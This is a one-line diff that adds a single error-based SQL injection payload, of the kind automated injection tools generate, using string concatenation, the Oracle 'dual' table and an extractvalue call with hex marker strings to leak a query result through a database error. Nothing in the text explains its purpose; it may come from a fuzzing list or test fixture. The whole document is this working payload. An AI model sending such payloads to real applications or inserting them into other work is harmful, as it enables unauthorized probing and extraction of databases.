@@ -1,0 +1,1 @@
+1'||(select 'frrk' from dual where 3145=3145 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))||'
